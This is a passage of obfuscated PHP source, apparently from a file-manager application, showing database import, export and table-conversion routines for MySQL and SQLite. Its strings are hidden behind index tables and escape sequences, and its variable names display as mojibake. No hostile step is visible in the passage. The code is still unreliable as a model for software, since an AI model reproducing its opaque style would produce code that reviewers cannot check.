sqlSplit(IO::getContent($ÄÛÍşÚ«)); foreach ($É£Õ ›í as $í„Ç¹è) { $ê’çÊÄÌ = stripos($í„Ç¹è, $§ïŞ÷¹[1171]) === 0; if ($ê’çÊÄÌ) { $ºŞ­êç->task[$§ïŞ÷¹[1172]] += 1; } $Ë°Ûı®->execute($í„Ç¹è); if ($ê’çÊÄÌ) { preg_match($§ïŞ÷¹[1173], $í„Ç¹è, $×†öÔ÷ú); $ºŞ­êç->task[$§ïŞ÷¹[1174]] = $×†öÔ÷ú[1]; $ºŞ­êç->update(1); } } } public function insertTable($·Îœ†Àà, &$ßæ¿ãµì) { $ƒÀûƒÙŸ =& $_SERVER[‰‰Ş‚€]; $Ÿƒ€æùş = $this->model()->db(); $×Åˆûºè = $©ÉéÑóæ ? array($©ÉéÑóæ) : $Ÿƒ€æùş->getTables(); foreach ($·Îœ†Àà as $Ì¹€„àÏ) { $©ÉéÑóæ = basename($Ì¹€„àÏ, $ƒÀûƒÙŸ[889]); if (!in_array($©ÉéÑóæ, $×Åˆûºè)) { continue; } $ßæ¿ãµì->task[$ƒÀûƒÙŸ[1174]] = $©ÉéÑóæ; if ($©ÉéÑóæ == $ƒÀûƒÙŸ[883]) { continue; } if (get_filesize($Ì¹€„àÏ) == 0) { continue; } $ÇÎÜœÙ¡ = $this->sqlToDb($Ì¹€„àÏ, $ßæ¿ãµì); if (!$ÇÎÜœÙ¡) { show_json(LNG($ƒÀûƒÙŸ[1175]) . "\x5b{$©ÉéÑóæ}\x5d", !1); } } } public function sqlFromDb($ìè¹Š”­, $ª†´¾İª, &$ü•œ‰Ëù, $¦¹öÖ‰¡ = '') { if ($ü•œ‰Ëù) { $ü•œ‰Ëù->task[$_SERVER[‰‰Ş‚€][1174]] = $ìè¹Š”­; } $°ˆğŒ¥À = $this->model($ìè¹Š”­); $…æ³“§È = 0; $öºÙ´¥Õ = 0; $¾ØóËä« = 10000; $×¼³‹‹Ñ = fopen($ª†´¾İª, $_SERVER[‰‰Ş‚€][1176]); $•Ú½÷ä³ = $°ˆğŒ¥À->getPk(); $µêğ÷·× = $°ˆğŒ¥À->getDbFields(); $Û£ãßõ = $_SERVER[‰‰Ş‚€][22]; if ($GLOBALS[$_SERVER[‰‰Ş‚€][888]] && in_array($ìè¹Š”­, array($_SERVER[‰‰Ş‚€][1177], $_SERVER[‰‰Ş‚€][1178]))) { $Û£ãßõ = $ìè¹Š”­; } do { $¤ÚÆ‡ƒ° = array($•Ú½÷ä³ => array($_SERVER[‰‰Ş‚€][1124], $öºÙ´¥Õ)); $ÈáéÈï» = $°ˆğŒ¥À->where($¤ÚÆ‡ƒ°)->field($µêğ÷·×)->order($•Ú½÷ä³ . $_SERVER[‰‰Ş‚€][1179])->limit($¾ØóËä«)->select(); $ÈáéÈï» = !empty($ÈáéÈï») ? $ÈáéÈï» : array(); if (!($¾È‡øúˆ = count($ÈáéÈï»))) { break; } $ÒˆˆûóÊ = end($ÈáéÈï»); $öºÙ´¥Õ = $ÒˆˆûóÊ[$•Ú½÷ä³]; $‘Ü£™§É = array(); foreach ($ÈáéÈï» as $±¢•™) { if ($Û£ãßõ) { if ($ìè¹Š”­ == $_SERVER[‰‰Ş‚€][1177]) { if ($±¢•™[$_SERVER[‰‰Ş‚€][43]] == $_SERVER[‰‰Ş‚€][1180]) { $ÈÅ•üƒ = json_decode($±¢•™[$_SERVER[‰‰Ş‚€][459]], !0); if ($ÈÅ•üƒ[$_SERVER[‰‰Ş‚€][42]] == $GLOBALS[$_SERVER[‰‰Ş‚€][888]] && $ÈÅ•üƒ[$_SERVER[‰‰Ş‚€][846]] != 1) { continue; } } } else { if ($±¢•™[$_SERVER[‰‰Ş‚€][43]] == $_SERVER[‰‰Ş‚€][1181] && $±¢•™[$_SERVER[‰‰Ş‚€][105]] == $_SERVER[‰‰Ş‚€][884]) { continue; } } } if ($¦¹öÖ‰¡) { $±¢•™[$_SERVER[‰‰Ş‚€][97]] = "\173\x69\x6f\x3a{$¦¹öÖ‰¡}\175" . substr($±¢•™[$_SERVER[‰‰Ş‚€][97]], strlen("\x7b\151\157\72{$±¢•™[$_SERVER[‰‰Ş‚€][922]]}\175")); $±¢•™[$_SERVER[‰‰Ş‚€][922]] = $¦¹öÖ‰¡; } $‘Ü£™§É[] = $_SERVER[‰‰Ş‚€][1182] . $this->sqlEncode($±¢•™) . $_SERVER[‰‰Ş‚€][1183]; } $²‹’“‰Õ = "\x49\116\123\x45\122\124\40\x49\116\x54\117\x20\x60{$ìè¹Š”­}\140\x20\x28\140" . implode($_SERVER[‰‰Ş‚€][1184], $µêğ÷·×) . $_SERVER[‰‰Ş‚€][1185]; fwrite($×¼³‹‹Ñ, $²‹’“‰Õ . implode($_SERVER[‰‰Ş‚€][1186], $‘Ü£™§É) . $_SERVER[‰‰Ş‚€][84] . PHP_EOL); $…æ³“§È += $¾È‡øúˆ; if ($ü•œ‰Ëù) { $ü•œ‰Ëù->update($¾È‡øúˆ); } } while ($¾ØóËä« == $¾È‡øúˆ); fclose($×¼³‹‹Ñ); return $…æ³“§È; } public function sqlToDb($ò¡õÁ­, &$ÃÓ°™) { $ÌØô—Œ” =& $_SERVER[‰‰Ş‚€]; $úß×ÔÔ = $this->model()->db(); $¼ê£âÄ™ = @fopen($ò¡õÁ­, $ÌØô—Œ”[1187]); if (!$¼ê£âÄ™) { return !1; } $õ¦ï©’” = 0; $°í÷šÄ  = $ÌØô—Œ”[22]; $Â‰Õ£ = array(); $Ê©Ê¯ä = $this->dbType(); $»‹¢¼‰œ = $Ê©Ê¯ä == $ÌØô—Œ”[23] ? 500 : 2000; $¸ØÒüôß = basename($ò¡õÁ­, $ÌØô—Œ”[889]); $ä¤§“«š = 0; $ù±ªş = 4194304; while (!feof($¼ê£âÄ™)) { $ÊÒéıÂ = trim(fgets($¼ê£âÄ™)); if (!$ÊÒéıÂ) { continue; } $ßÆ³•“Î = $this->sqlDecode($ÊÒéıÂ, $Ê©Ê¯ä, $¸ØÒüôß); if (stripos($ßÆ³•“Î, $ÌØô—Œ”[439]) === 0) { if (!$°í÷šÄ ) { $°í÷šÄ  = $ßÆ³•“Î . $ÌØô—Œ”[63]; } continue; } if ($ÃÓ°™) { $ÃÓ°™->task[$ÌØô—Œ”[1172]] += 1; } $õ¦ï©’”++; $Â‰Õ£[] = rtrim(rtrim(trim($ßÆ³•“Î), $ÌØô—Œ”[60]), $ÌØô—Œ”[84]); $ô˜º¶ûÁ = null; $—§‘å‘ = strlen($ßÆ³•“Î); $ä¤§“«š += $—§‘å‘; $“êì¿Óı = strlen($°í÷šÄ ) + $ä¤§“«š + (count($Â‰Õ£) - 1); if ($“êì¿Óı >= $ù±ªş) { $ô˜º¶ûÁ = array_pop($Â‰Õ£); if ($õ¦ï©’” > 1) { $õ¦ï©’”--; } } if ($õ¦ï©’” >= $»‹¢¼‰œ || $ô˜º¶ûÁ) { $ßÆ³•“Î = $°í÷šÄ  . implode($ÌØô—Œ”[60], $Â‰Õ£); if (!$úß×ÔÔ->execute($ßÆ³•“Î)) { return !1; } if ($ÃÓ°™) { $ÃÓ°™->update($õ¦ï©’”); } $Â‰Õ£ = array(); $õ¦ï©’” = 0; $ä¤§“«š = 0; if ($ô˜º¶ûÁ) { $Â‰Õ£ = array($ô˜º¶ûÁ); $õ¦ï©’” = 1; $ä¤§“«š = $—§‘å‘; } } } fclose($¼ê£âÄ™); if (!empty($Â‰Õ£)) { $ßÆ³•“Î = $°í÷šÄ  . implode($ÌØô—Œ”[60], $Â‰Õ£); if (!$úß×ÔÔ->execute($ßÆ³•“Î)) { return !1; } if ($ÃÓ°™) { $ÃÓ°™->update($õ¦ï©’”); } } return !0; } public function dropTable($ëå¥Ò = null) { $Üšç÷„ø =& $_SERVER[‰‰Ş‚€]; $–ß“±´Œ = $this->model()->db(); $¢„Õ° = $ëå¥Ò ? array($ëå¥Ò) : $–ß“±´Œ->getTables(); if (!$¢„Õ°) { return; } foreach ($¢„Õ° as $ëå¥Ò) { if ($ëå¥Ò) { $ëå¥Ò = strtolower($ëå¥Ò); } else { continue; } $–ß“±´Œ->execute($Üšç÷„ø[1188] . $this->escapeName($ëå¥Ò) . $Üšç÷„ø[1189]); } } private function sqlEncode($®‘Ã¢éõ) { $÷º““Íú =& $_SERVER[‰‰Ş‚€]; $Û´…øÚù = array(); foreach ($®‘Ã¢éõ as $¦¾†µ€) { if (is_array($¦¾†µ€)) { $¦¾†µ€ = json_encode_force($¦¾†µ€); } $¦¾†µ€ = addslashes($¦¾†µ€); $¦¾†µ€ = str_replace(array($÷º““Íú[1190], $÷º““Íú[10], $÷º““Íú[426]), array($÷º““Íú[1191], $÷º““Íú[1192], $÷º““Íú[1193]), $¦¾†µ€); $Û´…øÚù[] = $¦¾†µ€; } return $÷º““Íú[68] . implode($÷º““Íú[1194], $Û´…øÚù) . $÷º““Íú[68]; } private function sqlDecode($¯ùµ™ñ, $¨ñàîÚ£, $‡à÷Îôˆ = '') { $’÷ÄøßÖ =& $_SERVER[‰‰Ş‚€]; $¯ùµ™ñ = str_replace(array($’÷ÄøßÖ[1191], $’÷ÄøßÖ[1192], $’÷ÄøßÖ[1193]), array($’÷ÄøßÖ[1190], $’÷ÄøßÖ[10], $’÷ÄøßÖ[426]), $¯ùµ™ñ); if ($¨ñàîÚ£ == $’÷ÄøßÖ[23]) { $¯ùµ™ñ = str_ireplace($’÷ÄøßÖ[1195], $’÷ÄøßÖ[69], $¯ùµ™ñ); $¯ùµ™ñ = stripslashes($¯ùµ™ñ); } return preg_replace($’÷ÄøßÖ[1196], $’÷ÄøßÖ[22], $¯ùµ™ñ); if ($¨ñàîÚ£ == $’÷ÄøßÖ[23]) { return $‡à÷Îôˆ != $’÷ÄøßÖ[883] ? stripslashes($¯ùµ™ñ) : $¯ùµ™ñ; } if ($‡à÷Îôˆ == $’÷ÄøßÖ[883]) { $¯ùµ™ñ = str_replace($’÷ÄøßÖ[1197], $’÷ÄøßÖ[129], stripslashes($¯ùµ™ñ)); } return $¯ùµ™ñ; } public function getSqlFile($ĞÎÂ—‚ = '') { $¥ò…ü–‡ =& $_SERVER[‰‰Ş‚€]; $î¶½Ä¿« = $this->dbType(!0); $‡ºßÆšª = CONTROLLER_DIR . "\x69\x6e\163\x74\141\x6c\154\x2f\144\x61\x74\141\x2f{$î¶½Ä¿«}\56\x73\161\154"; if (!file_exists($‡ºßÆšª)) { return !1; } $å¡Õ•ß‚ = file_get_contents($‡ºßÆšª); $ŒºÙê¨ = $¥ò…ü–‡[1198] . ($î¶½Ä¿« == $¥ò…ü–‡[907] ? $¥ò…ü–‡[1199] : $¥ò…ü–‡[1200]) . $¥ò…ü–‡[1201]; preg_match_all($ŒºÙê¨, $å¡Õ•ß‚, $ÃÕÓâ¦³); $ØµËÃı = $ÃÕÓâ¦³[1]; $ŞÏ˜à³Á = $this->model()->db(); $œŞ›ô«É = $ŞÏ˜à³Á->getTables(); $½½Œßáœ = TEMP_FILES . $¥ò…ü–‡[1202] . date($¥ò…ü–‡[270]) . $¥ò…ü–‡[18]; del_dir($½½Œßáœ); mk_dir($½½Œßáœ); $Ô„œÓ± = $½½Œßáœ . $¥ò…ü–‡[1203]; $Ö¥Ë§Ší = $½½Œßáœ . $¥ò…ü–‡[1204]; $¾—öëÔ£ = $î¶½Ä¿« == $¥ò…ü–‡[23] ? $¥ò…ü–‡[907] : $¥ò…ü–‡[23]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\x74\141\154\154\57\x64\141\x74\x61\57{$¾—öëÔ£}\x2e\x73\x71\154", $½½Œßáœ); @touch($½½Œßáœ . $î¶½Ä¿« . $¥ò…ü–‡[889]); $Ï÷İ•ö = fopen($Ô„œÓ±, $¥ò…ü–‡[1176]); $æ¬“ŒÁñ = fopen($Ö¥Ë§Ší, $¥ò…ü–‡[1176]); if ($î¶½Ä¿« == $¥ò…ü–‡[23]) { $œŞ›ô«É = array_diff($œŞ›ô«É, array($¥ò…ü–‡[881], $¥ò…ü–‡[882])); $¹¯õ¨“‹ = array($¥ò…ü–‡[1205], $¥ò…ü–‡[1206], $¥ò…ü–‡[1207]); fwrite($æ¬“ŒÁñ, implode(PHP_EOL, $¹¯õ¨“‹) . PHP_EOL . PHP_EOL); foreach ($œŞ›ô«É as $…»Ù¼æÏ) { $ì›Şú«ä = $this->sqlFromSqlite($…»Ù¼æÏ); if (!$ì›Şú«ä[$¥ò…ü–‡[23]]) { continue; } fwrite($æ¬“ŒÁñ, $ì›Şú«ä[$¥ò…ü–‡[23]] . PHP_EOL . PHP_EOL); if (!in_array($…»Ù¼æÏ, $ØµËÃı)) { fwrite($Ï÷İ•ö, $ì›Şú«ä[$¥ò…ü–‡[907]] . PHP_EOL . PHP_EOL); } } } else { foreach ($œŞ›ô«É as $…»Ù¼æÏ) { $ì›Şú«ä = $this->sqlFromMysql($…»Ù¼æÏ); if (!$ì›Şú«ä[$¥ò…ü–‡[907]]) { continue; } fwrite($Ï÷İ•ö, $ì›Şú«ä[$¥ò…ü–‡[907]] . PHP_EOL . PHP_EOL); if (!in_array($…»Ù¼æÏ, $ØµËÃı)) { fwrite($æ¬“ŒÁñ, $ì›Şú«ä[$¥ò…ü–‡[23]] . PHP_EOL . PHP_EOL); } } } fclose($Ï÷İ•ö); fclose($æ¬“ŒÁñ); $å¡Õ•ß‚ = array($¥ò…ü–‡[907] => $Ô„œÓ±, $¥ò…ü–‡[23] => $Ö¥Ë§Ší); return $ĞÎÂ—‚ ? $å¡Õ•ß‚[$ĞÎÂ—‚] : $å¡Õ•ß‚; } public function dbType($½åÄ¨µ = false) { $»Æ€¨é =& $_SERVER[‰‰Ş‚€]; $½å²ï÷ = $½åÄ¨µ ? $GLOBALS[$»Æ€¨é[16]][$»Æ€¨é[31]] : $this->database; $½å²ï÷ = array_change_key_case($½å²ï÷); $î´ÄÈÄÙ = $½å²ï÷[$»Æ€¨é[1077]]; if ($î´ÄÈÄÙ == $»Æ€¨é[1074]) { $ÖİÛëƒ = explode($»Æ€¨é[14], $½å²ï÷[$»Æ€¨é[1083]]); $î´ÄÈÄÙ = $ÖİÛëƒ[0]; } $âøûŞì¿ = array($»Æ€¨é[1208] => $»Æ€¨é[23], $»Æ€¨é[1022] => $»Æ€¨é[907]); if (isset($âøûŞì¿[$î´ÄÈÄÙ])) { $î´ÄÈÄÙ = $âøûŞì¿[$î´ÄÈÄÙ]; } return $î´ÄÈÄÙ; } public function sqlFromMysql($ÁÌ·ñÁ‡, $¼ö‘™Âì = '') { $£¤­¤ =& $_SERVER[‰‰Ş‚€]; $ïÜØÅ£ = array($£¤­¤[907] => $£¤­¤[22], $£¤­¤[23] => $£¤­¤[22]); $ŸÃ©šô = $this->escapeName($ÁÌ·ñÁ‡); $ËäÓìõõ = $this->escapeName($ÁÌ·ñÁ‡, $£¤­¤[23]); $ƒ©„ÃÛÁ = $this->model()->db(); $—‹‹è÷” = $ƒ©„ÃÛÁ->query("\163\x68\157\167\40\143\x72\145\141\x74\x65\x20\164\141\x62\154\x65\x20{$ŸÃ©šô}\x3b"); if (!$—‹‹è÷” || !$—‹‹è÷”[0]) { return !1; } $å¿¿§Ò« = _get($—‹‹è÷”[0], $£¤­¤[1209], $£¤­¤[22]); if (!$å¿¿§Ò«) { return !1; } $ßßİ³³æ = "\x44\122\x4f\120\40\124\101\102\114\x45\40\111\x46\40\x45\x58\111\x53\124\x53\x20{$ŸÃ©šô}\73" . PHP_EOL . $å¿¿§Ò« . $£¤­¤[84]; if ($¼ö‘™Âì == $£¤­¤[907]) { return $ßßİ³³æ; } $ïÜØÅ£[$£¤­¤[907]] = $ßßİ³³æ; $”àšÑÜã = array_change_key_case($GLOBALS[$£¤­¤[16]][$£¤­¤[31]]); $İ¤ç­÷¡ = $”àšÑÜã[$£¤­¤[1082]]; $ Å®Ï = $£¤­¤[1210] . $İ¤ç­÷¡ . "\x27\x20\x41\x4e\x44\x20\x54\101\102\x4c\105\137\x4e\x41\115\105\x20\x3d\40{$ËäÓìõõ}\73"; $İÊß¡Ÿ = "\123\110\x4f\x57\x20\111\x4e\x44\105\x58\x20\x46\x52\x4f\115\40{$ŸÃ©šô}\73"; $¯¸Ÿ½ÜŸ = $ƒ©„ÃÛÁ->query($ Å®Ï); if (empty($¯¸Ÿ½ÜŸ)) { return $¼ö‘™Âì ? $ïÜØÅ£[$¼ö‘™Âì] : $ïÜØÅ£; } $°©¬Çæ = $ƒ©„ÃÛÁ->query($İÊß¡Ÿ); $†Ä¥¥âŠ = $£¤­¤[22]; $ÆÂïâÍ = array(); foreach ($°©¬Çæ as $¯¹¡ì–Œ) { if (!$†Ä¥¥âŠ && $¯¹¡ì–Œ[$£¤­¤[1211]] == $£¤­¤[1212]) { $†Ä¥¥âŠ = $¯¹¡ì–Œ[$£¤­¤[1213]]; } if (isset($ÆÂïâÍ[$¯¹¡ì–Œ[$£¤­¤[1211]]])) { $ÆÂïâÍ[$¯¹¡ì–Œ[$£¤­¤[1211]]][$£¤­¤[1214]][] = $¯¹¡ì–Œ[$£¤­¤[1213]]; continue; } $ÆÂïâÍ[$¯¹¡ì–Œ[$£¤­¤[1211]]] = array($£¤­¤[1215] => $¯¹¡ì–Œ[$£¤­¤[1211]], $£¤­¤[1214] => array($¯¹¡ì–Œ[$£¤­¤[1213]]), $£¤­¤[1216] => $¯¹¡ì–Œ[$£¤­¤[1217]] == $£¤­¤[101] ? 0 : 1); } $É¿ £õ = array(); foreach ($ÆÂïâÍ as $¯¹¡ì–Œ) { $ü•æÈÈÓ = $¯¹¡ì–Œ[$£¤­¤[1215]] == $£¤­¤[1212]; $ÀÆŠ˜¬” = $¯¹¡ì–Œ[$£¤­¤[1216]] == $£¤­¤[101] && !$ü•æÈÈÓ ? $£¤­¤[1218] : $£¤­¤[22]; $±“ÂŒ‰± = $£¤­¤[1219] . $ÁÌ·ñÁ‡ . $£¤­¤[21] . ($ü•æÈÈÓ ? $£¤­¤[1220] : $¯¹¡ì–Œ[$£¤­¤[1215]]); $ŸŠ®“¤Ò = $£¤­¤[1221] . implode($£¤­¤[1222], $¯¹¡ì–Œ[$£¤­¤[1214]]) . $£¤­¤[1223]; $É¿ £õ[] = sprintf($£¤­¤[1224], $£¤­¤[1225], $ÀÆŠ˜¬”, $£¤­¤[1226], $±“ÂŒ‰±, $£¤­¤[1227], $ÁÌ·ñÁ‡, $ŸŠ®“¤Ò); } $áÈšÆô¡ = array(); $Ã¬ìœø = array($£¤­¤[1228] => $£¤­¤[399], $£¤­¤[1229] => $£¤­¤[399], $£¤­¤[373] => $£¤­¤[399], $£¤­¤[372] => $£¤­¤[399], $£¤­¤[1230] => $£¤­¤[1231], $£¤­¤[1232] => $£¤­¤[1231], $£¤­¤[1231] => $£¤­¤[1231], $£¤­¤[1233] => $£¤­¤[1231], $£¤­¤[293] => $£¤­¤[1231], $£¤­¤[1234] => $£¤­¤[1231], $£¤­¤[1235] => $£¤­¤[1231], $£¤­¤[1236] => $£¤­¤[1237], $£¤­¤[374] => $£¤­¤[1237], $£¤­¤[375] => $£¤­¤[1237], $£¤­¤[1238] => $£¤­¤[1238]); foreach ($¯¸Ÿ½ÜŸ as $¯¹¡ì–Œ) { $¼ö‘™Âì = _get($Ã¬ìœø, $¯¹¡ì–Œ[$£¤­¤[1239]], $¯¹¡ì–Œ[$£¤­¤[1240]]); $à÷Û®¸ = $¯¹¡ì–Œ[$£¤­¤[1241]] == $£¤­¤[1005] ? $£¤­¤[1242] : $£¤­¤[1243]; $Æ£úì™‚ = $¯¹¡ì–Œ[$£¤­¤[1244]] == $†Ä¥¥âŠ ? $£¤­¤[1245] : $£¤­¤[22]; $¡‰³ö¥ = $¯¹¡ì–Œ[$£¤­¤[1059]] ? strtoupper(str_replace($£¤­¤[21], $£¤­¤[22], $¯¹¡ì–Œ[$£¤­¤[1059]])) : $£¤­¤[22]; $áÈšÆô¡[] = sprintf($£¤­¤[1246], $¯¹¡ì–Œ[$£¤­¤[1244]], $¼ö‘™Âì, $à÷Û®¸, $Æ£úì™‚, $¡‰³ö¥); } $€…ˆùİé = array("\x44\122\x4f\120\40\x54\101\102\x4c\x45\x20\x49\106\40\105\x58\x49\x53\124\123\x20{$ËäÓìõõ}\73", "\x43\122\105\x41\124\x45\40\x54\101\102\x4c\x45\x20{$ËäÓìõõ}\x20\50", implode($£¤­¤[60] . PHP_EOL, $áÈšÆô¡), $£¤­¤[1247]); $ô–šòœÚ = implode(PHP_EOL, array_merge($€…ˆùİé, $É¿ £õ)); if ($¼ö‘™Âì == $£¤­¤[23]) { return $ô–šòœÚ; } $ïÜØÅ£[$£¤­¤[23]] = $ô–šòœÚ; return $ïÜØÅ£; } public function sqlFromSqlite($ĞÑ¡’Ôˆ, $ÑØèÉ¼Ğ = '') { $ä÷Æàï =& $_SERVER[‰‰Ş‚€]; $÷È™‹Ÿ¬ = array($ä÷Æàï[907] => $ä÷Æàï[22], $ä÷Æàï[23] => $ä÷Æàï[22]); $íÁƒÎŸÊ = $this->escapeName($ĞÑ¡’Ôˆ); $ÔĞÌµìæ = $this->escapeName($ĞÑ¡’Ôˆ, $ä÷Æàï[23]); $£“÷„îÒ = $this->model()->db(); $ÛıŒî‹ = "\x50\x52\x41\x47\x4d\101\x20\x54\101\102\x4c\105\x5f\111\116\106\117\x20\x28\47{$ĞÑ¡’Ôˆ}\47\51"; $˜í‘Şò = "\x53\105\x4c\105\x43\124\x20\52\x20\106\122\117\115\x20\x73\161\x6c\151\164\145\137\x6d\141\x73\164\x65\x72\40\127\110\x45\122\x45\40\164\x62\x6c\x5f\156\x61\155\x65\x20\x3d\x20\x27{$ĞÑ¡’Ôˆ}\x27"; $È¥º·”Ş = $£“÷„îÒ->query($ÛıŒî‹); if (empty($È¥º·”Ş)) { return $ÑØèÉ¼Ğ ? $÷È™‹Ÿ¬[$ÑØèÉ¼Ğ] : $÷È™‹Ÿ¬; } $Áûì‡Ÿ = $£“÷„îÒ->query($˜í‘Şò); $®¥©“è = $Ë“¥ÍöÍ = array(); foreach ($Áûì‡Ÿ as $Ğñí¢‚Ö) { if ($Ğñí¢‚Ö[$ä÷Æàï[43]] == $ä÷Æàï[366]) { $®¥©“è[] = $Ğñí¢‚Ö[$ä÷Æàï[1248]]; } else { $Ë“¥ÍöÍ[$Ğñí¢‚Ö[$ä÷Æàï[42]]] = $Ğñí¢‚Ö[$ä÷Æàï[1248]]; } } $ŒøÍÑÓ˜ = array_merge(array("\104\122\x4f\120\x20\124\101\x42\114\105\x20\111\x46\40\x45\130\111\x53\124\x53\40{$ÔĞÌµìæ}\x3b"), $®¥©“è, array_values($Ë“¥ÍöÍ)); $ŒøÍÑÓ˜ = implode($ä÷Æàï[84] . PHP_EOL, $ŒøÍÑÓ˜) . $ä÷Æàï[84]; if ($ÑØèÉ¼Ğ == $ä÷Æàï[23]) { return $ŒøÍÑÓ˜; } $÷È™‹Ÿ¬[$ä÷Æàï[23]] = $ŒøÍÑÓ˜; $†íá…‹Ê = array(); $©ÃïØ¢ğ = array(); foreach ($Ë“¥ÍöÍ as $Ú‡»Ãüì => $¿¾ÂÒÀğ) { $·ÖÎê†œ = str_replace($ä÷Æàï[1219] . $ĞÑ¡’Ôˆ . $ä÷Æàï[21], $ä÷Æàï[22], $Ú‡»Ãüì); $·ÖÎê†œ = str_replace($ĞÑ¡’Ôˆ . $ä÷Æàï[21], $ä÷Æàï[22], $·ÖÎê†œ); $¦Õ°Üîø = str_replace(array($ä÷Æàï[129], $ä÷Æàï[1067]), $ä÷Æàï[480], substr($¿¾ÂÒÀğ, stripos($¿¾ÂÒÀğ, $ä÷Æàï[347]))); $†íá…‹Ê[$·ÖÎê†œ] = $¦Õ°Üîø; $©ÃïØ¢ğ[$·ÖÎê†œ] = $¿¾ÂÒÀğ; } $ãØ½Ö™ø = $’Ó˜±ª = array(); $Œ¢È´ê = array(); $ãÓí¸– = array($ä÷Æàï[1229] => $ä÷Æàï[1249], $ä÷Æàï[399] => $ä÷Æàï[1250], $ä÷Æàï[1237] => $ä÷Æàï[1251], $ä÷Æàï[1231] => $ä÷Æàï[1233], $ä÷Æàï[1238] => $ä÷Æàï[1252]); $–¾ÜôÒğ = $ö÷ÎÃç¡ = $ä÷Æàï[22]; foreach ($È¥º·”Ş as $Ğñí¢‚Ö) { $»µ¶´íÅ = strtolower($Ğñí¢‚Ö[$ä÷Æàï[43]]); if ($»µ¶´íÅ == $ä÷Æàï[1231] && isset($†íá…‹Ê[$Ğñí¢‚Ö[$ä÷Æàï[42]]])) { if (!in_array($Ğñí¢‚Ö[$ä÷Æàï[42]], array($ä÷Æàï[459], $ä÷Æàï[179], $ä÷Æàï[544]))) { $»µ¶´íÅ = $ä÷Æàï[1253]; } else { $’Ó˜±ª[] = $Ğñí¢‚Ö[$ä÷Æàï[42]]; } } $Œ¢È´ê[$Ğñí¢‚Ö[$ä÷Æàï[42]]] = $»µ¶´íÅ; $ÑØèÉ¼Ğ = _get($ãÓí¸–, $»µ¶´íÅ, $»µ¶´íÅ); $‰¹ŒğÊ¹ = $ä÷Æàï[22]; if ($Ğñí¢‚Ö[$ä÷Æàï[67]] == $ä÷Æàï[101]) { if (stripos($»µ¶´íÅ, $ä÷Æàï[373]) !== !1) { $‰¹ŒğÊ¹ = $ä÷Æàï[1254]; } $–¾ÜôÒğ = $Ğñí¢‚Ö[$ä÷Æàï[42]]; } $ Ô¹ŸÎà = $Ğñí¢‚Ö[$ä÷Æàï[66]] === null ? $ä÷Æàï[1255] : (is_string($Ğñí¢‚Ö[$ä÷Æàï[66]]) ? "\x27{$Ğñí¢‚Ö[$ä÷Æàï[66]]}\47" : $Ğñí¢‚Ö[$ä÷Æàï[66]]); $Æ«óñíÆ = $Ğñí¢‚Ö[$ä÷Æàï[45]] == $ä÷Æàï[101] ? $ä÷Æàï[1242] : $ä÷Æàï[1256] . $ Ô¹ŸÎà; $ãØ½Ö™ø[] = sprintf($ä÷Æàï[1257], $Ğñí¢‚Ö[$ä÷Æàï[42]], $ÑØèÉ¼Ğ, $Æ«óñíÆ, $‰¹ŒğÊ¹); } foreach ($†íá…‹Ê as $·ÖÎê†œ => $¦Õ°Üîø) { if (stripos($©ÃïØ¢ğ[$·ÖÎê†œ], $ä÷Æàï[1212]) !== !1) { $  õÜşĞ = $ö÷ÎÃç¡ = $ä÷Æàï[1258] . $–¾ÜôÒğ . $ä÷Æàï[1259]; } else { $æ‡°æ¹Í = stripos($©ÃïØ¢ğ[$·ÖÎê†œ], $ä÷Æàï[1218]) !== !1; $¢±¨ôÏï = !1; $€‚Ä­» = array(); $”Ñı²©’ = explode($ä÷Æàï[60], rtrim(ltrim($¦Õ°Üîø, $ä÷Æàï[347]), $ä÷Æàï[1012])); foreach ($”Ñı²©’ as $Ú‡»Ãüì) { $Ú‡»Ãüì = trim($Ú‡»Ãüì, $ä÷Æàï[1007]); if (isset($Œ¢È´ê[$Ú‡»Ãüì]) && $Œ¢È´ê[$Ú‡»Ãüì] == $ä÷Æàï[1253] || in_array($Ú‡»Ãüì, $’Ó˜±ª)) { $¢±¨ôÏï = !0; $€‚Ä­»[] = "\x60{$Ú‡»Ãüì}\140\x28\62\65\x30\51"; } else { $€‚Ä­»[] = "\140{$Ú‡»Ãüì}\x60"; } } if ($¢±¨ôÏï) { $¦Õ°Üîø = $ä÷Æàï[347] . implode($ä÷Æàï[60], $€‚Ä­») . $ä÷Æàï[1012]; } $  õÜşĞ = ($æ‡°æ¹Í ? $ä÷Æàï[1260] : $ä÷Æàï[22]) . "\x4b\x45\x59\40\140{$·ÖÎê†œ}\x60\x20{$¦Õ°Üîø}"; } $ãØ½Ö™ø[] = $  õÜşĞ; } if ($–¾ÜôÒğ && !$ö÷ÎÃç¡) { $ãØ½Ö™ø = array_merge(array($ä÷Æàï[1258] . $–¾ÜôÒğ . $ä÷Æàï[1259]), $ãØ½Ö™ø); } $‰Î¦ŞŞ¬ = array("\104\x52\117\120\40\124\101\102\x4c\x45\40\111\x46\40\105\x58\111\123\x54\x53\40{$íÁƒÎŸÊ}\x3b", "\x43\x52\x45\x41\x54\x45\40\124\x41\x42\114\105\x20{$íÁƒÎŸÊ}\x20\x28", implode($ä÷Æàï[60] . PHP_EOL, $ãØ½Ö™ø), $ä÷Æàï[1261]); $ºì×Ñòª = implode(PHP_EOL, $‰Î¦ŞŞ¬); if ($ÑØèÉ¼Ğ == $ä÷Æàï[907]) { return $ºì×Ñòª; } $÷È™‹Ÿ¬[$ä÷Æàï[907]] = $ºì×Ñòª; return $÷È™‹Ÿ¬; } private function escapeName($›©ôÁô, $Õë©Ë¡š = "\155\171\x73\x71\x6c") { $¨ØÂ¼Õ÷ =& $_SERVER[‰‰Ş‚€]; $›©ôÁô = preg_replace($¨ØÂ¼Õ÷[1262], $¨ØÂ¼Õ÷[22], $›©ôÁô); if ($Õë©Ë¡š === $¨ØÂ¼Õ÷[907]) { return "\x60{$›©ôÁô}\140"; } return "\x22{$›©ôÁô}\42"; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ü˜†ï™Í, $‰Ñö¦ß) { $ìÎÚÚŞï =& $_SERVER[‰‰Ş‚€]; $üŸš­ÁÎ = $‰Ñö¦ß; $GLOBALS[$ìÎÚÚŞï[1263]] = $ìÎÚÚŞï[1264] . $Ü˜†ï™Í; Hook::trigger($ìÎÚÚŞï[1264] . $Ü˜†ï™Í . $ìÎÚÚŞï[1265], $üŸš­ÁÎ); $‹÷­ÍÓ = self::driverMake($‰Ñö¦ß[0]); if (!$‹÷­ÍÓ) { return !1; } if ($Ü˜†ï™Í == $ìÎÚÚŞï[641] || $Ü˜†ï™Í == 